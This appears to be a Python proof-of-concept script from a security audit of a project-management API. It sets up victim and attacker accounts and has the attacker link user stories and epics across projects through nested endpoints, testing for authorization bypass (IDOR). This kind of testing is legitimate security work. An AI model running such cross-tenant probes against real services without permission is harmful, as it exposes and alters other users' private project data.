import sys
sys.path.insert(0, '/root/johto-task4/L2/scratch/proofs')
from lib import *

v = register(uniq("vic"))
a = register(uniq("att"))
anon = Client()
pv = new_project(v)
pa = new_project(a)
PV, PA = pv["id"], pa["id"]
ev = v.post("/epics", {"project": PV, "subject": "victim epic"}).json()
usv = v.post("/userstories", {"project": PV, "subject": "victim SECRET us"}).json()
iv = v.post("/issues", {"project": PV, "subject": "victim SECRET issue"}).json()
mv = v.post("/milestones", {"project": PV, "name": "victim sprint",
                            "estimated_start": "2026-01-01", "estimated_finish": "2026-01-15"}).json()
ea = a.post("/epics", {"project": PA, "subject": "attacker epic"}).json()
usa = a.post("/userstories", {"project": PA, "subject": "attacker us"}).json()
ia = a.post("/issues", {"project": PA, "subject": "attacker issue"}).json()
print("PV", PV, "PA", PA, "ev", ev["id"], "usv", usv["id"], "iv", iv["id"], "mv", mv["id"], "ea", ea["id"])

print("--- E2: nested create with epic in body != epic in URL")
show("att POST related_userstories URL=EV body epic=EA us=usa",
     a.post("/epics/%s/related_userstories" % ev["id"], {"epic": ea["id"], "user_story": usa["id"]}))

print("--- E2b: link a US the attacker cannot see into the attacker's own epic")
show("att POST related_userstories URL=EA us=usv(victim)",
     a.post("/epics/%s/related_userstories" % ea["id"], {"epic": ea["id"], "user_story": usv["id"]}))
show("att epic counts", a.get("/epics/%s" % ea["id"]), keys=["user_stories_counts"])
show("att related list", a.get("/epics/%s/related_userstories" % ea["id"]))
